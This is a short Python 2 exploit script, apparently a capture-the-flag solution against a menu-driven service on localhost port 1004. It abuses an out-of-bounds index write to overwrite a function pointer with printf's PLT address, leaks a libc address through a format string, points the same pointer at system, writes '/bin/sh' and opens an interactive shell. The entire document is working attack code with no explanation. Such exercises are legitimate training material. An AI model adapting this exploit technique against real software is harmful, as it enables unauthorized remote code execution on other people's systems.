import struct, sys
from socket import *
import telnetlib

PUI = lambda x:struct.unpack('I', x)[0]

s = socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 1004))


def read_until(f):
    r = ''
    while f not in r:
        c = s.recv(1)
        if not c:
            break
        r += c
    return r

def change(index, value):
    if ((value & (1 << 31)) != 0):
        value = - ((1<<32) - value)
    print read_until("Exit\n\n")
    s.send("3\n")
    print read_until("change\n")
    s.send("%d\n" % index)
    print read_until("Value?\n")
    s.send("%d\n" % value)

def leak():
    print read_until("Exit\n\n")
    s.send("2\n")
    return int(read_until("\n")[100:108], 16) - 0x1ac3c4

def set_values(string):
    assert(len(string) % 4 == 0)
    values = map(PUI, [string[i:i+4] for i in xrange(0, len(string), 4)])

    for i in xrange(len(values)):
        change(i, values[i])

string = "%9x" * 13
string = string.ljust(40, "\x00")
set_values(string)

printf_plt = 0x8048460
change(-21, printf_plt)
raw_input()
libc_base = leak()
print "[*] LIBC_BASE : %08X" % libc_base
system = libc_base + 0x40100

set_values("/bin/sh\x00")
change(-21, system)

s.send("2\n")
t = telnetlib.Telnet()
t.sock = s
t.interact()
